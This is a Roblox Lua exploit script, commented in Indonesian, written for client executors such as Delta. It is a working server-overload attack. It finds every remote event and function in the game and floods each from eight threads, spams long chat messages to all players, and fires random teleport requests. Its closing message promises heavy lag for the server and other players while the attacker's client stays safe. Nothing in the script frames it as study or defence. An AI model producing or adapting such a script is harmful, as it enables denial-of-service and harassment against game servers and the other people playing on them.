-- Server overload PRO - efek ke semua player lain (aman untuk client executor)
-- Delta Executor & sejenisnya

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Kumpulkan semua RemoteEvent/RemoteFunction
local remotes = {}
local function scan(parent)
    for _, obj in ipairs(parent:GetChildren()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        elseif obj:IsA("Folder") or obj:IsA("Model") then
            scan(obj)
        end
    end
end

scan(ReplicatedStorage)
scan(game:GetService("Workspace"))
scan(game:GetService("Players"))
scan(game:GetService("Lighting"))

-- Remote chat khusus (jika ada)
local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
local sayRequest = chatRemote and chatRemote:FindFirstChild("SayMessageRequest")

-- Fungsi spam untuk satu remote (payload ringan)
local function spamRemote(remote)
    local isFunction = remote:IsA("RemoteFunction")
    while true do
        pcall(function()
            if isFunction then
                remote:InvokeServer(0)  -- integer kecil
            else
                remote:FireServer(0)    -- integer kecil
            end
        end)
        task.wait(0)  -- yield minimal, tidak membebani client
    end
end

-- Fungsi spam chat (broadcast ke semua player, sangat berat untuk server)
local function spamChat()
    if sayRequest then
        local messages = {
            string.rep("A", 150),
            string.rep("B", 150),
            string.rep("C", 150),
            string.rep("X", 150)
        }
        while true do
            for _, msg in ipairs(messages) do
                pcall(function()
                    sayRequest:FireServer(msg, "All")
                end)
            end
            task.wait(0.05)  -- sedikit jeda agar client tidak kepanasan
        end
    end
end

-- Jalankan spam untuk setiap remote dengan multiple thread
for _, remote in ipairs(remotes) do
    for i = 1, 8 do  -- 8 thread per remote
        task.spawn(spamRemote, remote)
    end
end

-- Jalankan spam chat jika ada
if sayRequest then
    for i = 1, 4 do
        task.spawn(spamChat)
    end
end

-- Loop tambahan: spam teleportasi karakter (optional, efek ke semua player via remote)
-- Cari remote yang umum untuk teleport
local teleportRemote = ReplicatedStorage:FindFirstChild("TeleportEvent") or 
                      ReplicatedStorage:FindFirstChild("RequestTeleport")
if teleportRemote and teleportRemote:IsA("RemoteEvent") then
    task.spawn(function()
        while true do
            pcall(function()
                teleportRemote:FireServer(Vector3.new(math.random(-5000,5000), 500, math.random(-5000,5000)))
            end)
            task.wait(0)
        end
    end)
end

print("Server overload aktif. Client aman, server dan player lain akan lag berat.")
while true do
    RunService.Heartbeat:Wait()
end
